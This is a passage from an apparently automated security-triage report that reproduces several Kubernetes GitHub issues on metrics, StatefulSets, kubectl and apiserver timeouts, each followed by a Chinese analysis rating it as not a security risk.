This was introduced in https://github.com/kubernetes/kubernetes/pull/119949 three weeks ago.

/sig instrumentation
/cc @rexagod 

#### Kubernetes version

master (soon 1.32)

#### Cloud provider

n/a


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue报告了在执行带有竞争检测的集成测试时，出现了数据竞争。数据竞争可能导致程序的不确定行为，如崩溃或数据损坏，但并非所有的数据竞争都构成安全风险。根据提供的信息，该数据竞争发生在`k8s.io/component-base/metrics.(*Counter).WithContext()`中，这是用于计数器的上下文处理。没有迹象表明攻击者可以利用该数据竞争来执行任意代码、提升权限或导致其他高风险的安全问题。

根据风险判断标准，除非能够证明该数据竞争可被攻击者利用并导致高风险的漏洞，否则不应将其视为安全风险。因此，该Issue不涉及安全风险。

---

## Issue #128538 container_memory_working_set_bytes shows previous container memory

- Issue 链接：[#128538](https://github.com/kubernetes/kubernetes/issues/128538)

### Issue 内容

#### What happened?

As raised at https://github.com/prometheus-operator/kube-prometheus/issues/2522, the `container_memory_working_set_bytes` metric shows memory from a killed container instance which is not running anymore, not allowing to use it to know the "real" memory usage.

In my case, I still see the last memory used by the previous container instance for 4:30 minutes, but from @vladmalynych I see in his case it seems to be only for around 3 minutes.

#### What did you expect to happen?

To only show data from the **current** running container.

#### How can we reproduce it (as minimally and precisely as possible)?

Trigger a container restart (OOMKilled or Eviction) and check the resulting metric.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
Client Version: v1.31.2
Kustomize Version: v5.4.2
Server Version: v1.31.1-gke.1678000 (Also happening in 1.29.8-gke.1211000)
```

</details>


#### Cloud provider

<details>
GKE
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
PRETTY_NAME="Ubuntu 22.04.5 LTS"
NAME="Ubuntu"
VERSION_ID="22.04"
VERSION="22.04.5 LTS (Jammy Jellyfish)"
VERSION_CODENAME=jammy
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=jammy
$ uname -a
Linux gke-*** 5.15.0-1067-gke #73-Ubuntu SMP Sat Aug 31 04:29:32 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue描述了在容器被杀死（如OOMKilled或Eviction）后，指标`container_memory_working_set_bytes`仍然显示已被杀死的容器实例的内存数据，持续时间约为3到4.5分钟。这可能导致监控数据不准确，影响对系统资源的实时监控和管理。

根据风险判断标准，此问题并不涉及安全风险：

1. **该风险不能被攻击者利用**：此问题仅影响监控数据的准确性，并不提供攻击者利用的途径。
2. **该风险不可能成为一个漏洞，并被分配CVE编号**：此问题不会导致系统被攻破或权限提升，不符合CVE的分配标准。
6. **Issue不涉及安全问题，则风险评级判断为不涉及**。

因此，根据以上分析，此Issue不涉及安全风险。

---

## Issue #128536 Unit tests support testing the passed path and its sub paths

- Issue 链接：[#128536](https://github.com/kubernetes/kubernetes/issues/128536)

### Issue 内容

#### What happened?

The current unit tests support running all test cases with `make test`; and `make check WHAT=./pkg/kubelet GOFLAGS=-v`, which will execute all test cases under the path `./pkg/kubelet` but not include those in its subdirectories. If you modify the code in multiple subdirectories of `pkg/kubelet`, and if you want to run unit tests, you need to explicitly import each subdirectory. This can be inconvenient and may lead to overlooking some test cases.


#### What did you expect to happen?

Therefore, we need something like a switch to allow running all test cases from the desired directory and its subdirectories, for example: `make test WHAT="pkg/kubelet" GOFLAGS=-v KUBE_SUBDIR=y`. If `KUBE_SUBDIR` is set to y or Y, all tests within `pkg/kubelet` and its subdirectories will be executed; otherwise, only the test cases within `pkg/kubelet` will be run.


#### How can we reproduce it (as minimally and precisely as possible)?

```
make check WHAT=./pkg/kubelet GOFLAGS=-v
```

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console

```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
通过对Issue内容的分析，该Issue提出了一个关于改进单元测试运行方式的建议，即添加一个开关，使得在执行单元测试时，可以递归地运行指定目录及其子目录下的所有测试用例。这个改进旨在提高开发者的测试效率，避免遗漏测试用例。

根据风险判断标准：
1. **该风险能被攻击者利用**：该Issue不涉及任何可被攻击者利用的风险。
2. **该风险有可能成为一个漏洞，并被分配CVE编号，使用CVSS 3.1评分标准打分，结果要在high以上**：不存在可能被分配CVE编号的漏洞。
3. **issue提交者在提交内容中暴露的敏感信息、不当操作、不当配置等问题，不属于安全风险**：不适用。
4. **在风险为拒绝服务（DoS）攻击时，如果攻击者需要一定权限才能够实施该攻击，则视情况需要降级处理**：不涉及。
5. **对于日志中泄露凭据的风险**：不涉及。
6. **如果Issue不涉及安全问题，则风险评级判断为不涉及**：符合此条。

因此，综合判断，该Issue不涉及安全风险。

---

## Issue #128529 Inconsistency of Partitions in StatefulSets with StartOrdinal Feature

- Issue 链接：[#128529](https://github.com/kubernetes/kubernetes/issues/128529)

### Issue 内容

#### What happened?

StatefulSet with 
```
Replicas 9
StartOrdinal 2
Partition 5
```

we will get 
[2,3,4,5,6] current revision
[7,8,9,10] updated revision

#### What did you expect to happen?

If I understand the partition with definition
https://github.com/kubernetes/kubernetes/blob/3036d107a0ee4855b992e9f49eded88e0a739734/staging/src/k8s.io/api/apps/v1/types.go#L117-L122

I will get
[2,3,4] current revision
[5,6,7,8,9,10] updated revision

Or we can define partition as the number of pods with current revision.

#### How can we reproduce it (as minimally and precisely as possible)?

1. Create a sts with partition 9 and start ordinal 2
```
apiVersion: apps/v1
kind: StatefulSet
metadata:
  creationTimestamp: "2024-09-12T03:06:27Z"
  generation: 1
  name: ss2
  resourceVersion: "23988"
  uid: d556aa7c-c4da-4676-8caa-4b32db831c37
spec:
  podManagementPolicy: OrderedReady
  replicas: 9
  revisionHistoryLimit: 10
  selector:
    matchLabels:
      baz: blah
      foo: bar
  serviceName: test
  ordinals: 
    start: 2
  template:
    metadata:
      labels:
        baz: blah
        foo: bar
    spec:
      containers:
      - image: xxxx
        imagePullPolicy: IfNotPresent
        name: nginx
        resources: {}
  updateStrategy:
    rollingUpdate:
      maxUnavailable: 1
      partition: 0
    type: RollingUpdate

```

2. update the sts and set partition as 5

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
Client Version: v1.29.3
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.28.7
```

</details>


#### Cloud provider

<details>
kind
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>
KCM
</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
经过分析，该Issue描述了在StatefulSet中使用StartOrdinal特性时，Partition的行为不一致的问题。这涉及到StatefulSet的更新策略和Pod的序号管理。根据Issue内容，这是一个功能实现上的问题，可能会导致集群中Pod的更新顺序或数量不符合预期。但从安全角度来看，这并不构成潜在的安全风险。攻击者无法利用该问题来进行攻击，也不会导致权限提升、敏感信息泄露或远程代码执行等高风险安全问题。因此，风险评级为不涉及。

---

## Issue #128528 Whether the master node should be stripped out of the logic of disruption in node-lifecycle-controller?

- Issue 链接：[#128528](https://github.com/kubernetes/kubernetes/issues/128528)

### Issue 内容

#### What happened?

Yesterday, I tested changing the status of all worker nodes to NotReady in order to verify the speed limiting logic in large-scale cluster failures. But when all worker nodes in a single availability zone (I only have one availability zone) are NotReady, they will not enter the single availability zone ` FullyDisruption` state.
If the master node is NotReady, it will cause kube-controller-manager  pod notReady, and the logic cannot continue to be processed. So why should the master node be included in the logic of the `Disruption` function?

#### What did you expect to happen?

When determining the `Disruption` function, the master node is not considered. Master node notready will cause pod not Ready.

#### How can we reproduce it (as minimally and precisely as possible)?

1.create a kubernetes cluster.
2.create >3 master node.
3.create some worker node.
make worker node notReady.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
经过分析，该Issue讨论了在Kubernetes集群中，当所有工作节点（worker node）变为NotReady状态时，由于主节点（master node）被包含在`Disruption`函数的逻辑中，导致不会进入`FullyDisruption`状态。提出了是否应将主节点从`Disruption`逻辑中剔除的问题。

此Issue主要关注的是Kubernetes节点管理逻辑的行为，对节点状态变更时集群的响应进行了探讨。Issue中并未提及任何可以被攻击者利用的安全漏洞，也没有涉及权限提升、命令执行、容器逃逸等高危安全问题。

根据风险判断标准：

1. **该风险能被攻击者利用**：Issue中没有描述任何攻击者可以利用的风险。
2. **该风险有可能成为一个漏洞，并被分配CVE编号，使用CVSS 3.1评分标准打分，结果要在high以上**：不存在可能被分配CVE编号的漏洞。
3. **Issue提交者在提交内容中暴露的敏感信息、不当操作、不当配置等问题，不属于安全风险**：不存在此类问题。
6. **如果Issue不涉及安全问题，则风险评级判断为不涉及**。

综上所述，该Issue不涉及安全风险。

---

## Issue #128524 use kubectl delete static pod, pod can't recreate

- Issue 链接：[#128524](https://github.com/kubernetes/kubernetes/issues/128524)

### Issue 内容

#### What happened?

I having a kube-scheduler static pod, configuration a kubescheduler-config.yaml to pod, i change this file in node, then exec `kubectl -n kube-system delete pods {scheduler-pod}`, then the pod is restarted. but i found kube-scheduler pod not using the latest configuration file.

#### What did you expect to happen?

I hope exec  `kubectl -n kube-system delete pods {scheduler-pod}` after, can create a new static pod. use latest configuration file.

#### How can we reproduce it (as minimally and precisely as possible)?

1. change `KubeSchedulerConfiguration` this config.
2. exec `kubectl -n kube-system delete pods {scheduler-pod}`.
3. found kube-scheduler pod use old config file.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue描述了更改kube-scheduler静态Pod的配置文件后，执行`kubectl delete pod`删除Pod，发现Pod未使用最新的配置文件。这是一个配置更新的问题，并不涉及安全风险。根据风险判断标准第3条，Issue提交者在提交内容中不当操作或配置引起的问题，不属于安全风险。因此，该Issue不涉及安全问题。

---

## Issue #128515 kubectl wait --for=create doesn't work with selectors

- Issue 链接：[#128515](https://github.com/kubernetes/kubernetes/issues/128515)

### Issue 内容

#### What happened?

This works:

```
kubectl wait --for=create someresourcetype/resource
```

But for generated resources where we need to filter, this immediately exits with `error: no matching resources found`:

```
kubectl wait --for=create someresourcetype -l somelabel
```

#### What did you expect to happen?

I'd expect `kubectl wait --for=create` to still wait when used with `-l`. Otherwise we're back to hacky sleeps and bash loops in cases where resource names are unknown (i.e. generated).

#### How can we reproduce it (as minimally and precisely as possible)?

```bash
#!/bin/bash
set -xeuo pipefail

# This works as expected.
(
sleep 1 && cat <<EOF | kubectl create -f - >/dev/null 2>&1
apiVersion: v1
kind: ConfigMap
metadata:
  name: unlabeled-cm
data:
  key: value
EOF
) & pid=$!

kubectl wait --for=create configmap/unlabeled-cm --timeout=10s || true

wait $pid

# This fails, since the filter failure seems to cause an early exit.
(
sleep 1 && cat <<EOF | kubectl create -f - >/dev/null 2>&1
apiVersion: v1
kind: ConfigMap
metadata:
  name: labeled-cm
  labels:
    hello: world
data:
  key: value
EOF
) & pid=$!

kubectl wait --for=create configmap -l hello=world --timeout=10s || true

wait $pid

# This works again, since the configmap now exists.
kubectl wait --for=create configmap -l hello=world --timeout=10s || true

kubectl delete configmap unlabeled-cm labeled-cm
```

#### Anything else we need to know?

I didn't test anything other than `-l`, but other filtering mechanisms might be broken with `--for=create` as well.

This issue is especially noticeable when working with generated resources. For instance, you might have some trigger after a while to invoke e.g. a Tekton PipelineRun. These PipelineRuns have predictable labels but unpredictable names, making name-based waiting impossible.

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.31.0
Kustomize Version: v5.4.2
Server Version: v1.31.0
```

</details>


#### Cloud provider

<details>
Local kind cluster, v0.24.0
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
NAME=Gentoo
ID=gentoo
PRETTY_NAME="Gentoo Linux"
ANSI_COLOR="1;32"
HOME_URL="https://www.gentoo.org/"
SUPPORT_URL="https://www.gentoo.org/support/"
BUG_REPORT_URL="https://bugs.gentoo.org/"
VERSION_ID="2.15"
$ uname -a
Linux 6.9.2-gentoo #1 SMP PREEMPT_DYNAMIC Mon May 27 01:25:56 CEST 2024 x86_64 GNU/Linux

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue描述了在使用`kubectl wait --for=create`命令并搭配标签选择器（`-l`选项）时，命令无法正确等待资源创建，而是立即退出并提示`error: no matching resources found`。这是一个功能性错误，而非安全漏洞。此问题并未涉及任何可被攻击者利用的安全风险，也没有导致信息泄露、权限提升、命令执行等高风险安全问题。

根据风险判断标准：

- **标准6**：如果Issue不涉及安全问题，则风险评级判断为不涉及。

因此，该Issue不涉及安全风险。

---

## Issue #128509 The request times out in dozens of milliseconds.

- Issue 链接：[#128509](https://github.com/kubernetes/kubernetes/issues/128509)

### Issue 内容

#### What happened?

I find that when the number of requests in the cluster is large, the return code 504 is returned for some requests, but the request takes only dozens of milliseconds. Why?
Some APIServer logs are as follows:

E1031 10:16:37.163017      11 writers.go:122] apiserver was unable to write a JSON response: http: Handler timeout
E1031 10:16:37.163055      11 status.go:71] apiserver received an error that is not an metav1.Status: &errors.errorString{s:"http: Handler timeout"}: http: Handler timeout
E1031 10:16:37.166591      11 writers.go:135] apiserver was unable to write a fallback JSON response: http: Handler timeout
E1031 10:16:37.167083      11 timeout.go:142] post-timeout activity - time-elapsed: 4.003161ms, GET "/api/v1/nodes/work233" result: <nil>
I1031 10:16:37.173768      11 node_authorizer.go:205] "NODE DENY" err="node 'work115' cannot get configmap manager/cloudsop.beidou.hostlog, no relationship to this object was found in the node authorizer graph"
{"level":"warn","ts":"2024-10-31T10:16:37.179181Z","logger":"etcd-client","caller":"v3@v3.5.9/retry_interceptor.go:62","msg":"retrying of unary invoker failed","target":"etcd-endpoints://0xc002799500/192.167.14.53:2379","attempt":0,"error":"rpc error: code = Canceled desc = context canceled"}
E1031 10:16:37.179302      11 status.go:71] apiserver received an error that is not an metav1.Status: &errors.errorString{s:"context canceled"}: context canceled
E1031 10:16:37.179404      11 writers.go:122] apiserver was unable to write a JSON response: http: Handler timeout
E1031 10:16:37.184405      11 status.go:71] apiserver received an error that is not an metav1.Status: &errors.errorString{s:"http: Handler timeout"}: http: Handler timeout
E1031 10:16:37.184759      11 writers.go:135] apiserver was unable to write a fallback JSON response: http: Handler timeout
I1031 10:16:37.189411      11 node_authorizer.go:205] "NODE DENY" err="node 'work115' cannot get configmap manager/caas, no relationship to this object was found in the node authorizer graph"
{"level":"warn","ts":"2024-10-31T10:16:37.191638Z","logger":"etcd-client","caller":"v3@v3.5.9/retry_interceptor.go:62","msg":"retrying of unary invoker failed","target":"etcd-endpoints://0xc002799500/192.167.14.53:2379","attempt":0,"error":"rpc error: code = Canceled desc = context canceled"}
E1031 10:16:37.191736      11 status.go:71] apiserver received an error that is not an metav1.Status: &errors.errorString{s:"context canceled"}: context canceled
E1031 10:16:37.191810      11 writers.go:122] apiserver was unable to write a JSON response: http: Handler timeout
E1031 10:16:37.192091      11 writers.go:122] apiserver was unable to write a JSON response: http: Handler timeout
E1031 10:16:37.192558      11 timeout.go:142] post-timeout activity - time-elapsed: 12.911662ms, GET "/api/v1/nodes/work233" result: <nil>
E1031 10:16:37.192682      11 writers.go:122] apiserver was unable to write a JSON response: http: Handler timeout
E1031 10:16:37.192798      11 status.go:71] apiserver received an error that is not an metav1.Status: &errors.errorString{s:"http: Handler timeout"}: http: Handler timeout
E1031 10:16:37.193019      11 writers.go:122] apiserver was unable to write a JSON response: http: Handler timeout
E1031 10:16:37.193034      11 status.go:71] apiserver received an error that is not an metav1.Status: &errors.errorString{s:"http: Handler timeout"}: http: Handler timeout
{"level":"warn","ts":"2024-10-31T10:16:37.195287Z","logger":"etcd-client","caller":"v3@v3.5.9/retry_interceptor.go:62","msg":"retrying of unary invoker failed","target":"etcd-endpoints://0xc0038c9c00/192.167.14.53:2379","attempt":0,"error":"rpc error: code = Canceled desc = context canceled"}
E1031 10:16:37.195425      11 writers.go:135] apiserver was unable to write a fallback JSON response: http: Handler timeout
E1031 10:16:37.195562      11 timeout.go:142] post-timeout activity - time-elapsed: 10.78091ms, PUT "/apis/coordination.k8s.io/v1/namespaces/kube-node-lease/leases/work233" result: <nil>
{"level":"warn","ts":"2024-10-31T10:16:37.198821Z","logger":"etcd-client","caller":"v3@v3.5.9/retry_interceptor.go:62","msg":"retrying of unary invoker failed","target":"etcd-endpoints://0xc0038c9c00/192.167.14.53:2379","attempt":0,"error":"rpc error: code = Canceled desc = context canceled"}
{"level":"warn","ts":"2024-10-31T10:16:37.202745Z","logger":"etcd-client","caller":"v3@v3.5.9/retry_interceptor.go:62","msg":"retrying of unary invoker failed","target":"etcd-endpoints://0xc0038c9c00/192.167.14.53:2379","attempt":0,"error":"rpc error: code = Canceled desc = context canceled"}
E1031 10:16:37.203114      11 finisher.go:175] FinishRequest: post-timeout activity - time-elapsed: 270.763µs, panicked: false, err: context canceled, panic-reason: <nil>
E1031 10:16:37.203153      11 finisher.go:175] FinishRequest: post-timeout activity - time-elapsed: 11.033912ms, panicked: false, err: context canceled, panic-reason: <nil>
E1031 10:16:37.203177      11 status.go:71] apiserver received an error that is not an metav1.Status: &errors.errorString{s:"http: Handler timeout"}: http: Handler timeout
E1031 10:16:37.203218      11 writers.go:135] apiserver was unable to write a fallback JSON response: http: Handler timeout
E1031 10:16:37.203244      11 status.go:71] apiserver received an error that is not an metav1.Status: &errors.errorString{s:"http: Handler timeout"}: http: Handler timeout
E1031 10:16:37.203260      11 finisher.go:175] FinishRequest: post-timeout activity - time-elapsed: 10.568058ms, panicked: false, err: context canceled, panic-reason: <nil>
E1031 10:16:37.210072      11 writers.go:122] apiserver was unable to write a JSON response: http: Handler timeout
E1031 10:16:37.210110      11 status.go:71] apiserver received an error that is not an metav1.Status: &errors.errorString{s:"http: Handler timeout"}: http: Handler timeout
E1031 10:16:37.220130      11 writers.go:122] apiserver was unable to write a JSON response: http: Handler timeout
E1031 10:16:37.220167      11 status.go:71] apiserver received an error that is not an metav1.Status: &errors.errorString{s:"http: Handler timeout"}: http: Handler timeout
E1031 10:16:37.220237      11 writers.go:135] apiserver was unable to write a fallback JSON response: http: Handler timeout
E1031 10:16:37.223611      11 writers.go:122] apiserver was unable to write a JSON response: http: Handler timeout
E1031 10:16:37.223646      11 status.go:71] apiserver received an error that is not an metav1.Status: &errors.errorString{s:"http: Handler timeout"}: http: Handler timeout
E1031 10:16:37.228423      11 writers.go:135] apiserver was unable to write a fallback JSON response: http: Handler timeout
E1031 10:16:37.228617      11 timeout.go:142] post-timeout activity - time-elapsed: 53.474833ms, PUT "/apis/coordination.k8s.io/v1/namespaces/kube-node-lease/leases/work200" result: <nil>

The preceding log shows that the /apis/coordination.k8s.io/v1/namespaces/kube-node-lease/leases/work233 request times out in 10 ms.


#### What did you expect to happen?

The request is returned normally.

#### How can we reproduce it (as minimally and precisely as possible)?

Check the APIServer audit logs when the number of requests is large.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```
1.28
</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
根据提供的Issue内容，问题描述是在集群请求量较大时，部分请求返回了504错误码，但请求仅耗时几十毫秒。日志显示APIServer由于`http: Handler timeout`无法写入JSON响应，还有一些关于节点无法获取configmap的授权错误。

从这些信息来看，问题似乎是由于在高负载情况下，APIServer处理请求超时导致的，这可能与系统性能或配置有关，并不涉及安全风险。

根据风险判断标准：

1. **该风险无法被攻击者利用**：没有证据表明攻击者可以利用此问题来进行攻击。

2. **该风险不可能成为一个漏洞并被分配CVE编号**：这是系统在高负载下的性能问题，不涉及安全漏洞。

6. **Issue不涉及安全问题**：因此风险评级判断为“不涉及”。

综上所述，该Issue不涉及安全风险。

---

## Issue #128483 SchedulingWhileGated test in scheduler-perf failed but was able to produce results

- Issue 链接：[#128483](https://github.com/kubernetes/kubernetes/issues/128483)

### Issue 内容

#### What happened?

While trying to reproduce the Scheduler_perf results from #127180 , I encountered an issue where the SchedulingWhileGated test failed but still produced results.
I’m running the following code on an Ubuntu 22.04 Linux VM with 4 CPUs, 8GB memory, and a 100GB hard disk, under various configurations.

`make test-integration WHAT=./test/integration/scheduler_perf ETCD_LOGLEVEL=warn KUBE_TEST_VMODULE="''" KUBE_TEST_ARGS="-run=^$$ -benchtime=1ns -bench=BenchmarkPerfScheduling/SchedulingWhileGated/1Node_10000GatedPods"`

I obtained the following results, which show the same trend the PR mentioned, but my tests actually failed. Could you let me know if this outcome is normal at your convenience please?

> QHint enabled master branch vs. this branch : 117 pods/s→ 103pods/s performance decline
> QHint disabled master branch vs. this branch : 92 pods/s → 123 pods/s performance improve

message generated by executing the code above

```
make[1]: *** [Makefile:192: test] Error 1
make[1]: Leaving directory '/home/xie/go/src/k8s.io/kubernetes'
!!! [1018 05:41:12] Call tree:
!!! [1018 05:41:12] 1: hack/make-rules/test-integration.sh:108 runTests(...)
+++ [1018 05:41:12] Cleaning up etcd
+++ [1018 05:41:13] Integration test cleanup complete
make: *** [Makefile:215: test-integration] Error 1
```


#### What did you expect to happen?

I’d like to know if this is normal behavior. If it’s not, it should be possible to obtain the correct results without the test failing.

#### How can we reproduce it (as minimally and precisely as possible)?

Run the following code under the following four configurations.
`make test-integration WHAT=./test/integration/scheduler_perf ETCD_LOGLEVEL=warn KUBE_TEST_VMODULE="''" KUBE_TEST_ARGS="-run=^$$ -benchtime=1ns -bench=BenchmarkPerfScheduling/SchedulingWhileGated/1Node_10000GatedPods"` 

I conducted four test cases, and I think each test can generate similar results.
1. Master branch, SchedulerQueueingHints Disable
2. Master branch, SchedulerQueueingHints Enable
3. [#127180](https://github.com/kubernetes/kubernetes/pull/127180) PR branch, SchedulerQueueingHints Disable
4. [#127180](https://github.com/kubernetes/kubernetes/pull/127180) PR branch, SchedulerQueueingHints Enable

#### Anything else we need to know?

/sig scheduling

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
根据提供的Issue内容，报告者在运行调度器性能测试时遇到了测试失败的问题，但仍然生成了结果。他们希望确认这是否是正常行为，以及如何在不使测试失败的情况下获得正确的结果。整个Issue内容涉及测试过程中的错误和性能结果的差异，没有涉及任何安全漏洞、敏感信息泄露或潜在的安全风险。因此，根据风险判断标准，本Issue不涉及安全风险。

---

